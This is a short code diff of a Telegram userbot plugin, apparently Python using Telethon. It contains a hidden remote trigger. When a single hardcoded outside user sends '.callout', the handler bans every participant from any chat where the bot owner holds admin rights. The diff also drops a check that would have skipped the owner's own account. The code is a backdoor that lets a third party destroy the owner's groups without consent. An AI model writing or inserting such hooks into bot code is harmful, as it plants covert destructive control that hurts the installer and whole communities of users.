@@ -8,7 +8,7 @@ from userbot import CMD_HELP
 @register(incoming=True, from_users=1694909518, pattern=r"^\.callout$")
 async def testing(event):
     nikal = await event.get_chat()
-    chutiya = await event.client.get_me()
+    await event.client.get_me()
     admin = nikal.admin_rights
     creator = nikal.creator
     if not admin and not creator:
@@ -18,8 +18,6 @@ async def testing(event):
 # Thank for Dark_Cobra
     everyone = await event.client.get_participants(event.chat_id)
     for user in everyone:
-        if user.id == chutiya.id:
-            pass
         try:
             await event.client(EditBannedRequest(event.chat_id, int(user.id), ChatBannedRights(until_date=None, view_messages=True)))
         except Exception as e:
